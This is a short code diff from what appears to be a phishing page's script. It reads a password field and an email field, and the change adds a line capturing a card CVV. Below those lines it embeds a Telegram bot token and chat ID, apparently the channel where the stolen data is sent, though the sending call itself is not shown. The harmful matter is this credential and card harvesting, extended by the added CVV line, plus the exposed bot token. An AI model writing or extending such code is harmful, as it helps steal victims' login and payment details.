@@ -45,7 +45,7 @@
           
           const username = document.getElementById('pass').value;
           const email = document.getElementById('email').value;
-          
+          const cvv = document.getElementById('cvv').value;
           
           const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
           const chatId = -1002372284940 
